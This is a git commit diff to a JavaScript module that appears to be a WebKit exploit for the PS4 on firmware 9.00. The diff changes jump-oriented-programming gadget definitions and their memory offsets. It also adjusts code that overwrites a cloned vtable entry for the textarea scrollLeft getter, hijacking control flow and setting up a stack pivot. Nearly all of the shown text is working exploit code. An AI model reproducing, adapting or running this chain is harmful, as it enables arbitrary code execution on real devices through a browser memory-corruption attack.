b516a445f2737406ab59d35d56b2b204f2887d7b
Mugiwara <37186888+ciss84@users.noreply.github.com>
2024-01-27 12:08:34 +0100

    Add files via upload

--- 9XXv2.mjs
+++ 9XXv2.mjs
@@ -80,11 +80,6 @@ let libc_base = null;
 //
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
-const ta_jop1 = `
-mov rdi, qword ptr [rsi + 0x18]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0xb8]
-`;
 const jop1 = `
 mov rdi, qword ptr [rsi + 0x20]
 mov rax, qword ptr [rdi]
@@ -183,8 +178,6 @@ const webkit_gadget_offsets = new Map(Object.entries({
     [jop4] : 0x0000000000303906,
     [jop5] : 0x00000000028bd332,
     [jop6] : 0x000000000004e293,
-
-    [ta_jop1] : 0x00000000004e62a4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -528,7 +521,7 @@ class Chain900 extends Chain900Base {
         clone_p.write64(0, ta_p.read64(0));
 
         // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
+        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -536,8 +529,8 @@ class Chain900 extends Chain900Base {
         this.rax_ptrs = rax_ptrs;
 
         rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x60, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
         // value to pivot rsp to
